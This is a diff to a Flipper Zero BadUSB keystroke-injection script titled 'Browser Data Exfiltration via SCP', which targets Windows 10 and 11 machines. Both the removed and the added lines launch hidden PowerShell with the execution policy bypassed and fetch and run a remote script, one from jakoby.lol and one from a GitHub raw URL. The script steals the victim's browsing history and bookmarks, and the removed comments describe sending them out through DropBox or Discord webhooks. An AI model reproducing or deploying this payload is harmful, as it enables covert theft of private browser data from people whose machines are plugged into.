@@ -1,17 +1,8 @@
-REM     Title: Browser-Data
-
-REM     Author: I am Jakoby
-
-REM     Description: This payload will grab your targets brosing history and bookmarks from IE, Chrome, Firefox, and Opera GX.
-
-REM     Target: Windows 10, 11
-
+REM Title: Browser Data Exfiltration via SCP
+REM Description: Extract browser data and send it to a remote server using SCP
+DELAY 1000
 GUI r
 DELAY 500
-STRING powershell -w h -ep bypass $dc='';$db='';irm https://jakoby.lol/hgw | iex
+STRING powershell -w h -ep bypass "Invoke-WebRequest -Uri https://raw.githubusercontent.com/CalebCurranVelasco/Flipper-Zero-BadUSB/refs/heads/main/Payloads/Flip-BrowserData/browserData.ps1 -OutFile $env:TEMP\browserdata.ps1; powershell -ExecutionPolicy Bypass -File $env:TEMP\browserdata.ps1"
 ENTER
 
-REM     Fill in either variable or both to set your exfil method.
-REM     $db is the variable that holds your DropBox token.
-REM     $dc is the variable that holds your Discord webhook.   
-REM     If you are using DropBox, also remember to replace ?dl=0 with ?dl=1 at the end of your link so it is executed properly.
